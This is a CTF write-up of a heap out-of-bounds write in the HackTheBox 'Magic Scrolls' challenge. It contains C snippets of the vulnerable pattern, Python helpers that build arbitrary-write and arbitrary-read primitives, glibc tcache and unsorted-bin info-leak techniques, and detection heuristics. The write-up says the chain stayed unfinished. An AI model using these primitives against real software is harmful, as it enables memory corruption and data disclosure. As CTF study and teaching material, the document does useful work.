# OOB Write via State-Controlled Index ("Power" Variable)

A class of CTF heap-OOB challenges where a globally-state variable (e.g., `power`) controls the INDEX of a multi-element array write. By manipulating program state (e.g., wrong password), the state variable forces the array index OUT OF BOUNDS, overwriting an ADJACENT structure.

## Pattern

```c
int power = 0;
// password check: wrong → power = 4
if (strcmp(input, "Alohomora") != 0) power = 4;

void update_magic_numbers() {
    int idx;
    scanf("%d", &idx); idx--;
    if (idx < 0 || idx > 3) return;  // valid bounds 0..3
    scanf("%ld", &magic_numbers[idx]);  // valid 4-entry write

    if (power != 0) {
        magic_numbers[power]   = magic_numbers[0] & magic_numbers[2];   // power=4 → magic_numbers[4] is OOB
        magic_numbers[power+1] = magic_numbers[1] & magic_numbers[3];   // power=5 → OOB
    }
}

struct {
    long magic_numbers[4];  // .bss @ 0x5060
    void *spells[16];        // .bss @ 0x5080
    long spell_len[16];      // .bss @ 0x5100
    ...
} state;
```

`magic_numbers[4]` lands at `spells[0]` (32 bytes after `magic_numbers[0]`). Wrong-password forces power=4 → arbitrary 8-byte write to `spells[0]` via `mn[0] & mn[2]`.

## Primitive Acquisition

To set `spells[0] = V` (chosen 8-byte value):

```python
def write_spells0(p, V):
    update_magic(p, 1, V)   # mn[0] = V
    # Side effect: spells[0] = mn[0]&mn[2] = V & 0 = 0 (mn[2] still 0)
    update_magic(p, 3, V)   # mn[2] = V
    # Side effect: spells[0] = mn[0]&mn[2] = V & V = V ✓
```

**Critical**: Each `update_magic` call ALSO clobbers the secondary OOB target (`spells[1]` via mn[1]&mn[3]). Plan write order carefully.

## 1-Byte Memset Partial-Overwrite Bonus

The same code typically has a special branch when BOTH operands are zero:

```c
if (mn[0] == 0 && mn[2] == 0)
    memset(&mn[power], 0, 1);  // 1-byte zero of LSB
else
    mn[power] = mn[0] & mn[2];  // 8-byte AND write
```

**The memset path PRESERVES the high 7 bytes of `spells[power]`.** When `spells[0]` is a freshly-malloc'd heap pointer, zeroing LSB shifts it to a page-aligned (low byte = 0) heap address.

Trigger memset path: send `update_magic(1, 0)` while `mn[2]=0` (its initial value).

## Length-Confusion in `set_favorite_spell`

The same challenge typically has a "favorite" reference with double-fetch behavior:

```c
void set_favorite_spell() {
    if (super_spell_set == -1) {
        // First call
        scanf("%d", &idx);
        if (idx in valid range && spell_len[idx] < 0x101) {
            super_spell = spells[idx];
            super_spell_set = idx;
            super_spell_len = spell_len[idx];   // LENGTH locked
        }
    } else {
        // Subsequent call — re-fetches spells but NOT spell_len
        super_spell = spells[super_spell_set];
        // super_spell_len NOT updated
        puts("Favorite spell already set.");
    }
}

void read_spell() {
    for (i = 1; i < super_spell_len; i++)
        putchar(super_spell[i-1]);
}
```

**Exploit**: Lock `super_spell_len` to maximum (0x100) via a chunk of size 0x100 on the first call. Then OOB-write `spells[idx_first_set_fav] = ANY_ADDRESS`. Subsequent set_favorite call re-fetches → read_spell prints 0xFF bytes from ANY_ADDRESS.

## Arbitrary Read Primitive

```python
# Step 1: Lock super_spell_len
create(p, b'A' * 0x100)    # idx 0, spell_len 0x100
set_fav_first(p, 0)         # super_spell_len = 0x100 LOCKED

# Step 2: OOB-write spells[0]
write_spells0(p, target_addr)

# Step 3: Re-fetch via else-branch
set_fav_else(p)             # super_spell = spells[0] = target_addr (super_spell_len unchanged)

# Step 4: Read 0xFF bytes from target_addr
out = read_raw(p)
data = extract_bytes(out, 0xFF)
```

## Info-Leak Pitfalls

**Critical pitfall**: The arbitrary-read primitive needs an INITIAL ADDRESS. Without an info-leak, the read crashes.

Common info-leak sources:
1. **Format-string vuln** — check ALL printf/fprintf calls for non-fixed format args.
2. **Tcache fd safe-link** (glibc 2.32+): free the FIRST chunk in a tcache bin → its fd = `chunk_addr >> 12` (heap leak). Need spells[idx] to point at that chunk's user data.
3. **Unsorted bin fd/bk**: free a chunk >0x420 → fd/bk = `main_arena_addr` (libc leak).
4. **Memset 1-byte shift**: zeroing LSB of spells[0] shifts to nearby heap address. Read tcache_perthread_struct entries[] (if populated by sufficient frees).

## Why Memset Shift OFTEN Fails for Heap Leak

For a binary with malloc-cap of 0x1FF bytes (e.g., `read(0, buf, 0x1ff)`), max chunk_size = 0x210 → tcache bin index 31. The TCache struct's `entries[]` array spans 0x90..0x28F within the chunk (512 bytes for 64 entries × 8 bytes).

For chunk0 user at `heap_base + 0x2A0` (typical layout after tcache_init's 0x290-byte struct chunk + 0x10 chunk header), zeroing LSB lands at `heap_base + 0x200`. **This is entries[46..63] — bins for chunk_size 0x300..0x420, which are UNREACHABLE if max chunk_size is 0x210.**

**Lesson**: when memset-shift lands in a "high entries" region of tcache struct, the bins are NOT populatable via the binary's own malloc operations → leak path fails.

## Workaround Strategies

If memset shift doesn't land in a populatable area:
1. Look for a SECOND chunk with a DIFFERENT LSB. E.g., chunk1 (after a small chunk0) has a different offset.
2. Check if create_spell allows requests for larger sizes via input encoding (e.g., scanf reading hex/octal that overflows).
3. Look for a HEAP CORRUPTION path that places a chunk at a different aligned offset.
4. Re-read the binary for a SECOND OOB primitive or format-string vuln.

## References

- Real-world example: HackTheBox "Magic Scrolls" challenge (Pwn, Hard) — implements this exact pattern. Primitives identified but info-leak path remained elusive in 41-experiment investigation; documented as cautionary tale.
- glibc 2.34+ `tcache_key` is random (NOT heap-based) — older guides claiming "tcache_key leaks heap" are obsolete.
- safe-link formula: `stored_fd = next_chunk_addr ^ (current_chunk_addr >> 12)`.

## Detection Heuristics

Spot this pattern in a binary when:
1. A global state variable (e.g., `power`, `level`, `mode`) is used as an array index for writes.
2. Said variable can be set out-of-bounds via authentication failure or similar state transition.
3. The "favorite/select" pattern stores a length on first call but not subsequent calls.
4. The "favorite" call has multiple branches and the ELSE branch re-fetches pointer but skips length update.
